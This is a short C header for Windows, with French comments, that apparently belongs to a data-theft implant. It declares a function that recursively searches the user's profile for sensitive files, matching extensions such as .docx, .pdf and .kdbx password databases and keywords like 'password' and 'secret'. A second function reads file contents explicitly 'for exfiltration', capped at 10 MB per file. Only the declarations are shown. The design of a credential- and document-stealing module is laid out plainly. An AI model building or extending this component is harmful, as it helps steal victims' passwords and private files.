#ifndef EXFIL_H
#define EXFIL_H

#include <windows.h>

/*
 * Recherche des fichiers sensibles dans un répertoire.
 * startPath: répertoire de départ (NULL = USERPROFILE)
 * byExtension: recherche par extensions sensibles (.docx, .pdf, .kdbx...)
 * byKeyword: recherche par mots-clés (password, secret...)
 * maxDepth: profondeur max de récursion (0 = défaut 5)
 * outJson: résultat JSON avec la liste des fichiers
 */
BOOL Exfil_SearchFiles(const char* startPath, BOOL byExtension, BOOL byKeyword,
                       int maxDepth, char** outJson);

/*
 * Lit le contenu d'un fichier pour exfiltration.
 * Limite à 10 MB par fichier.
 */
BOOL Exfil_ReadFile(const char* filePath, BYTE** outData, DWORD* outSize);

#endif // EXFIL_H
